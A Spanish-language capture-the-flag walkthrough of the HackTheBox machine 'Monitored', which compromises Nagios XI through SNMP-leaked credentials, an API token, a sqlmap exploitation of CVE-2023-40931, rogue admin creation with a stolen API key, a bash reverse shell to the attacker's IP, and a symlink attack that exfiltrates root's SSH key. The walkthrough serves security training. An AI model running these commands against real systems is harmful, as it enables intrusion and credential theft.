![[Pasted image 20250508185235.png]]


**Publicado:** 08 de Mayo de 2025 
**Autor:** José Miguel Romero aka x3m1Sec 
**Dificultad:** ⭐ Easy

## 📝 Descripción

Monitored es una máquina Linux de dificultad fácil que implica la explotación de un sistema de monitorización Nagios XI. El recorrido comienza con la enumeración de servicios, donde encontramos un servidor web Apache, LDAP, SSH y SNMP.

A través del servicio SNMP descubrimos credenciales de un usuario deshabilitado que nos permiten obtener un token de API para Nagios XI. Con este acceso limitado, explotamos una vulnerabilidad de inyección SQL (CVE-2023-40931) en el componente de mensajes banner para extraer información de la base de datos.

Utilizando las API keys obtenidas, creamos un usuario administrador en Nagios XI que nos permite ejecutar comandos remotos y conseguir acceso al sistema como usuario nagios. Finalmente, abusamos de un script que podemos ejecutar como sudo y que maneja enlaces simbólicos de forma insegura para obtener la clave SSH privada del usuario root y completar la máquina.
## 🚀 Metodología

```mermaid
flowchart TD
    %% Diagrama de la metodología para máquina Monitored (HTB)
    A[Reconocimiento Inicial] --> B[Enumeración de Puertos]
    B --> C[Puerto 22 - SSH]
    B --> D[Puerto 80/443 - Web]
    B --> E[Puerto 389 - LDAP]
    B --> F[Puerto 5667 - tcpwrapped]
    B --> G[Puerto 161/UDP - SNMP]
    
    D --> H[Dominio nagios.monitored.htb]
    H --> I[Nagios XI 5.11.0]
    I --> J[Intento credenciales por defecto]
    J --> |Fallido| K[Enumeración SNMP]
    
    G --> K
    K --> L[Descubrimiento credenciales svc:XjH7VCehowpR1xZB]
    L --> M[Login web fallido - Usuario deshabilitado]
    L --> N[Autenticación API con token]
    
    N --> O[Exploración API Nagios XI]
    O --> P{Vulnerabilidad SQL Injection}
    P --> Q[Exploit CVE-2023-40931]
    Q --> R[Extracción datos usuarios]
    
    R --> S[API Key nagiosadmin]
    S --> T[Creación de usuario administrador]
    T --> U[Acceso panel administrador]
    
    U --> V[Ejecución de comandos remotos]
    V --> W[Reverse shell como nagios]
    W --> X[Enumeración de privilegios sudo]
    
    X --> Y[Explotación script getprofile.sh]
    Y --> Z[Creación de symlink a id_rsa]
    Z --> AA[Extracción clave privada SSH root]
    
    AA --> AB[Acceso SSH como root]
    AB --> AC[Captura de flag]
```




## 🔭 Reconocimiento

### Ping para verificación en base a TTL

```bash
❯ ping -c2 10.10.11.248      
PING 10.10.11.248 (10.10.11.248) 56(84) bytes of data.
64 bytes from 10.10.11.248: icmp_seq=1 ttl=63 time=47.6 ms
64 bytes from 10.10.11.248: icmp_seq=2 ttl=63 time=47.9 ms

--- 10.10.11.248 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1010ms
rtt min/avg/max/mdev = 47.624/47.766/47.909/0.142 ms
```

> 💡 **Nota**: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.

### Escaneo de puertos

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.227 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```bash
❯ echo $ports                                                               
22,80,389,443,5667
```

### Enumeración de servicios TCP

```bash
nmap -sC -sV -p$ports 10.10.11.248 -oN services.txt

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_ssl-date: TLS randomness does not represent time
5667/tcp open  tcpwrapped
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.48 seconds
```

### Enumeración de servicios UDP

```bash 
nmap -sU  -F 10.10.11.248   

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 19:19 CEST
Nmap scan report for nagios.monitored.htb (10.10.11.248)
Host is up (0.045s latency).
Not shown: 96 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
123/udp open          ntp
161/udp open          snmp
162/udp open|filtered snmptrap
```

NOTA: Especificamos la flag -F para escanear los puertos más comunes.

## 🌐 Enumeración Web

### Puerto 80 HTTP (Apache 2.4.56)

Gracias a la enumeración de servicios con nmap descubrimos que se está aplicando una redirección al vhost nagios.monitored.htb


<div align="center">

```
10.10.11.248 - nagios.monitored.htb
```

</div>

 ⚠️  Debemos agregar este dominio a nuestro archivo hosts.

```bash
echo "10.10.11.248 nagios.monitored.htb monitored.htb" | sudo tee -a /etc/hosts
```


![[Pasted image 20250508185715.png]]


![[Pasted image 20250508185818.png]]


Nagios es otro sistema y producto de monitoreo de red. Nagios ha tenido una amplia variedad de problemas a lo largo de los años, incluida la ejecución remota de código, la escalada de privilegios de raíz, la inyección SQL, la inyección de código y el XSS almacenado. Si se encuentra con una instancia de Nagios, vale la pena buscar las credenciales predeterminadas `nagiosadmin:PASSW0RD` y tomar las huellas digitales de la versión.

EN esta ocasión no tenemos éxito con las credenciales por defecto.
#### 🕷️ Fuzzing de vhosts

Relizamos fuzzing de vhosts por si pudiésemoa añadir algo más a nuestro scope pero únicamente encontramos el de nagios

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://monitored.htb -H 'Host:FUZZ.monitored.htb' -fc 301
```
![[Pasted image 20250508190419.png]]


#### 🕷️ Fuzzing de directorios

```bash
feroxbuster -u https://nagios.monitored.htb -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -k
```


![[Pasted image 20250508194516.png]]
Como único hallazgo relevante encontramos el recurso /nagiosxi

NOTA: indicamos la flag -k para omitir los certificados TLS inválidos
### 389 OpenLDAP

Usamos el siguiente script para la enumeración LDAP:

- [https://github.com/bloodstiller/ldapire](https://github.com/bloodstiller/ldapire)

Anonymous bind está deshabilitado.

![[Pasted image 20250508191824.png]]

También podemos verificarlo con ldapsearch:

```bash
ldapsearch -x -H ldap://nagios.monitored.htb -s base -b "" "(objectClass=*)" "*" +   
```


### 161  SNMP  UDP

Lanzamos la herramienta [snmp-check](https://github.com/superzero10/snmp-check) para enumerar información de este servicio:

```
snmp-check 10.10.11.248              
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.248:161 using SNMPv1 and community 'public'
```

Hay mucha información pero en la parte relativa a "procesos" descubrimos algo interesante:

![[Pasted image 20250508193131.png]]

Parece que se está llamando un script con el usuario svc y una contraseña:

`svc:XjH7VCehowpR1xZB`


Probamos esta contraseña con diversos servicios como SSH, a intentar enumerar LDAP con credenciales y con el panel de login de Nagios, pero no tenemos éxito, aunque sí notamos que algo cambia en el panel de login de Nagios en el mensaje que recibimos:

![[Pasted image 20250508193835.png]]

Ya nos nos indica `Invalid username or password.`ahora tenemos otro error distinto lo cual nos hace sospechar que el usuarios svc exista con esas credenciales pero ha sido deshabilitado porque además el error es distinto si la contraseña no es correcta.


Tenemos credenciales, pero no podemos acceder a la interfaz web debido a que la cuenta está deshabilitada.
Investigando en Nagios , encontramos este post https://support.nagios.com/forum/viewtopic.php?p=310411#p310411 en los foros de Nagios que nos proporciona el siguiente comando,
utilizando la API del servicio:

```bash
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=YOURPASS&valid_min=5'
```


Si lo usamos usando las credenciales descubiertas obtenemos un token que es válido durante 5 minutos:

```bash
curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
```

![[Pasted image 20250508194802.png]]

Seguimos las instrucciones del post para ver cómo puede usarse este token:

```bash
curl -k -L 'http://YOURXISERVER/nagiosxi/includes/components/nagioscore/ui/trends.php? createimage&host=localhost&token=TOKEN' > image.png
```

```bash
curl -k -L 'http://10.10.11.248/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=befcb077e9767d71b63d7370aea15281a7691a5d' > image.png
```

![[Pasted image 20250508195028.png]]

Funciona así que si aplicamos esta misma lógica al recurso /nagiosxi/index.php?token=XXX deberíamos tener acceso al index de la página:

```bash
https://nagios.monitored.htb/nagiosxi/index.php?token=bbe75ef7172d84c04ac070f457abb5739cf99a34
```


Logramos acceder con éxito y enumerar la versión: 5.11.0
![[Pasted image 20250508195527.png]]

Parece que esa versión es vulnerable a SQL injection:[CVE-2023-40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931)
https://pentest-tools.com/vulnerabilities-exploits/nagios-xi-v5110-sql-injection_23763

## 💉 Explotación

Debido a un mensaje o banner hecho en ajax. Hay un post donde se menciona esta vulnerabilidad:
https://outpost24.com/blog/nagios-xi-vulnerabilities/

```
Nagios XI features “Announcement Banners”, which can optionally be acknowledged by users. The endpoint for this feature is vulnerable to a SQL Injection attack. When a user acknowledges a banner, a POST request is sent to `/nagiosxi/admin/banner_message-ajaxhelper.php` with the POST data consisting of the intended action and message ID – `action=acknowledge banner message&id=3`. The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the `xi_session` and `xi_users` table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets. This vulnerability does not require the existence of a valid announcement banner ID, meaning it can be exploited by an attacker at any time.
```

Activamos el interceptor de Burpsuite y refrescamos la página y cambiamos la petición a POST:

![[Pasted image 20250508201156.png]]

Nota: Asegurarse de cambiar el valor Cookie por la cookie de autenticación de su sesión.

![[Pasted image 20250508201549.png]]
Enviando la petición, vemos un error SQL en la pestaña Respuesta, confirmando que podemos inyectar consultas SQL en el servicio. 


Existe un payload de sqlmap que permite automatizar esta inyección:

https://github.com/sealldeveloper/CVE-2023-40931-PoC

```bash
sqlmap -D nagiosxi -T xi_users -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=`curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=1000" | awk -F'"' '{print$12}'`" --dump --level 4 --risk 3 -p id --batch
```

```bash
Database: nagiosxi
Table: xi_users
[2 entries]
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 1746724206   | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 1              | 1701427555           |
| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1746725987   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 8              | 1699697433           |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
```

Encontramos información de dos usuarios con los hashes en formato bcrypt:

```bash
nagiosadmin: $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C
svc: $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK 
```

Intentamos crackear estos hashes con hashcat y rockyou  sin éxito:

```bash
hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt 
```

Hay otro campo más que puede ser interesante de la información que hemos obtenido con el dump de la tabla xi_users, el API KEY

```bash
nagiosadmin: IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
svc: 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK
```


Podemos usar el api key para intentar crear un nuevo usuario administrador como se indica en este exploit https://www.exploit-db.com/exploits/44969


Usamos el siguiente payload:
```bash
curl -k --silent "http://nagios.monitored.htb/nagiosxi/api/v1/system/user&apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" -d "username=pentester&password=P@ssw0rd123&name=TCG&email=tcg@localhost&auth_level=admin"
{"success":"User account pentester was added successfully!","user_id":6}
```

![[Pasted image 20250508202353.png]]

Logramos acceder con nuestra nueva cuenta:

![[Pasted image 20250508202456.png]]

Nos pide cambiar la contraseña la primera vez que ingresamos. Una vez hecho, a continuación nos vamos a Configure > Core Config Manager > Commands

![[Pasted image 20250508202627.png]]

A continuación introducimos el siguiente payload para obtener una reverse shell:

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/1234 0>&1'
```

![[Pasted image 20250508202820.png]]
Aplicamos la configuración.

Iniciamos un listener en el puerto que hayamos configurado:

```bash
 rlwrap nc -lnvp 1234     
```


Por último, vamos a Monitorización > Hosts y pulsamos sobre localhost . Seleccionamos ashell como comando de comprobación y pulsamos en Ejecutar comando de comprobación :![[Pasted image 20250508203326.png]]

Hacemos click en Run Check Command y deberemos recibir nuestra reverse shell:

![[Pasted image 20250508203416.png]]


Obtenemos la primera flag:

```bash
nagios@monitored:~$ cat user.txt
cat user.txt
7affa**********************44a55
nagios@monitored:~$ 
```
## 🔐 Escalada de Privilegios

Al hacer un sudo -l observamos que nagios puede ejecutar una gran variedad de scripts como sudo:

![[Pasted image 20250508203547.png]]

Uno de los que más nos puede interesar es el de getprofile.sh

Leyendo el código fuente de getprofile.sh , vemos que parte de su funcionalidad está destinada a recoger y consolidar varios registros y archivos de configuración en un directorio de perfil especificado por el usuario. Este script toma un argumento de la línea de comandos, que se supone que es el nombre o identificador del directorio para almacenar el perfil

```bash
#!/ bin / bash
#GRAB THE ID folder = $1
if
  ["$folder" == ""];
then echo "You must enter a folder name/id to generate a profile." echo
          "Example: ./getprofile.sh " exit 1 fi echo
    "Getting phpmailer.log..." 

if[-f / usr / local / nagiosxi / tmp /
                                  phpmailer.log];
then tail - 100 / usr / local / nagiosxi / tmp / phpmailer.log >
    "/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log" fi
```

El script comprueba si phpmailer.log existe en el directorio /usr/local/nagiosxi/tmp/ y si es así, utiliza el comando tail para copiar las últimas 100 líneas de este archivo de registro en una carpeta designada dentro de /usr/local/nagiosxi/var/components/profile/ . 

Dado que podemos ejecutar el script con privilegios elevados, esta funcionalidad es vulnerable.

La vulnerabilidad proviene del hecho de que el script no valida lo que es $carpeta ni asegura o la ruta utilizada en las operaciones de copia. Este descuido permite varios tipos de ataques al sistema de archivos. sistema de archivos, entre los que destacan:

Ataques de enlaces simbólicos: Un usuario puede crear un enlace simbólico ( symlink ) llamado phpmailer.log que apunta a un archivo sensible (por ejemplo, /root/.ssh/id_rsa ). Cuando el script se ejecute, seguirá el enlace simbólico y copiaría por error datos confidenciales en un directorio accesible.

Esto requiere que tengamos acceso a /usr/local/nagiosxi/tmp/phpmailer.log ,así que lo verificamos

```bash
ls -la /usr/local/nagiosxi/tmp/phpmailer.log 
ls -la /usr/local/nagiosxi/
```

![[Pasted image 20250508204306.png]]

Aunque el archivo de registro no existe, tenemos permisos de escritura en su directorio padre. A continuación, comprobamos la configuración SSH para ver si la autenticación como root está habilitada, y si PubkeyAuthentication está habilitado.

```bash
cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PubkeyAuthentication'
```

![[Pasted image 20250508204352.png]]

Esta configuración significa que si el usuario root tiene una clave privada en su directorio .ssh, podremos usarla para autenticar.


Para llevar a cabo la explotación seguimos los siguientes pasos:


Crear un Symlink: Creamos un enlace simbólico llamado phpmailer.log en el directorio /usr/local/nagiosxi/tmp/ que apunte a un archivo sensible, como la clave privada SSH del usuario root:

```bash
ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
```

Ejecutamos el script que podemos ejecutar como sudo

```bash
sudo ./getprofile.sh 1
```

Acceder a los datos copiados: El script seguiría el enlace simbólico y copiaría el contenido de la clave privada SSH de root de root en la carpeta del perfil bajo nuestro control, 

```bash
rm /usr/local/nagiosxi/tmp/phpmailer.log 
ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log 
sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1 
cp /usr/local/nagiosxi/var/components/profile.zip /tmp/ 
cd /tmp 
unzip profile.zip 
cat profile-/phpmailer.log
```

![[Pasted image 20250508204959.png]]

Copiamos la clave privada a nuestro host de ataque y le damos permiso 600 y nos conectamos vía ssh como root y obtenemos la flag:

```bash
ssh -i id_rsa root@10.10.11.248   
```

![[Pasted image 20250508205137.png]]


